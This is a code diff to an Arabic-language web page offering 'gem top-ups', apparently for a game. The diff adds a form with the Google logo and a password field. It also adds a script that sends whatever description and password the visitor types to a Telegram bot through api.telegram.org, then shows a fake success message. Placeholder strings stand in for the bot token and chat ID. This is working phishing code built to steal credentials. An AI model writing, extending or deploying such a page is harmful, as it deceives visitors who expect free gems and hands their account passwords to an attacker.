@@ -4,100 +4,141 @@
 <head>
   <meta charset="UTF-8">
   <title>شحن جواهر</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    /* 👑 الخلفية */
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background-image: url('girl.gif'); 
+      background: url('photo.gif') no-repeat center center fixed;
       background-size: cover;
-      background-repeat: no-repeat;
-      background-attachment: fixed;
     }
 
-    /* 👑 الغلاف العلوي */
-    #cover {
-      width: 100%;
+    .header {
+      background: url('photo.gif') no-repeat center center;
+      background-size: cover;
       height: 200px;
-      background-image: url('images.jpeg');
-      background-size: cover;
-      background-position: center;
-      box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
-    /* 👑 الوصف */
-    #description {
-      text-align: center;
-      font-size: 24px;
+    .title {
+      font-size: 28px;
       color: red;
       font-weight: bold;
+      animation: pulse 2s infinite, glow 2s ease-in-out infinite alternate;
       margin: 20px;
-      animation: glow 1s infinite alternate, pulse 1.5s infinite;
-    }
-
-    @keyframes glow {
-      from {
-        text-shadow: 0 0 5px red, 0 0 10px red, 0 0 15px red;
-      }
-      to {
-        text-shadow: 0 0 10px red, 0 0 20px red, 0 0 25px red;
-      }
+      text-align: center;
     }
 
     @keyframes pulse {
       0% { transform: scale(1); }
-      50% { transform: scale(1.03); }
+      50% { transform: scale(1.05); }
       100% { transform: scale(1); }
     }
 
-    /* 👑 مربعات الصور */
-    #boxes {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 20px;
+    @keyframes glow {
+      from {
+        text-shadow: 0 0 5px red, 0 0 10px red;
+      }
+      to {
+        text-shadow: 0 0 20px red, 0 0 30px red;
+      }
+    }
+
+    .boxes {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 15px;
       padding: 20px;
+      justify-items: center;
     }
 
     .box {
-      width: 250px;
-      height: 250px;
-      background: rgba(255, 255, 255, 0.05);
-      backdrop-filter: blur(8px);
-      border-radius: 20px;
-      overflow: hidden;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: transform 0.3s;
+      width: 200px;
+      height: 200px;
+      background: url('photo.png') center center;
+      background-size: cover;
+      filter: blur(3px);
+      border-radius: 15px;
     }
 
-    .box:hover {
-      transform: scale(1.05);
+    .form-container {
+      background: white;
+      width: 300px;
+      margin: 30px auto;
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      position: relative;
     }
 
-    .box img {
-      max-width: 100%;
-      max-height: 100%;
-      object-fit: cover;
+    .google-logo {
+      width: 40px;
+      position: absolute;
+      top: -20px;
+      left: 10px;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      background-color: #4285f4;
+      color: white;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background-color: #3367d6;
     }
   </style>
 </head>
 <body>
 
-  <div id="cover"></div>
+  <div class="header"></div>
 
-  <div id="description">شحن جواهر</div> <!-- 👑 وصف متوهج -->
+  <div class="title">شحن جواهر</div>
 
-  <div id="boxes">
-    <div class="box"><img src="images.jpeg" alt="1"></div>
-    <div class="box"><img src="images (2).jpeg" alt="2"></div>
-    <div class="box"><img src="images (1).jpeg" alt="3"></div>
-    <div class="box"><img src="images.jpeg" alt="4"></div>
-    <div class="box"><img src="images (1).jpeg" alt="5"></div>
+  <div class="boxes">
+    <div class="box"></div>
+    <div class="box"></div>
+    <div class="box"></div>
+    <div class="box"></div>
+    <div class="box"></div>
   </div>
+
+  <div class="form-container">
+    <img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo">
+    <input type="text" id="desc" placeholder="اكتب وصفًا">
+    <input type="password" id="pass" placeholder="كلمة السر">
+    <button onclick="sendToBot()">إرسال</button>
+  </div>
+
+  <script>
+    async function sendToBot() {
+      const token = "توكن_البوت";
+      const chat_id = "ايدى_التليجرام";
+      const description = document.getElementById("desc").value;
+      const password = document.getElementById("pass").value;
+
+      const message = `📥 وصف: ${description}\n🔑 كلمة السر: ${password}`;
+
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text: message })
+      });
+      alert("تم الإرسال بنجاح ✅");
+    }
+  </script>
 
 </body>
 </html>
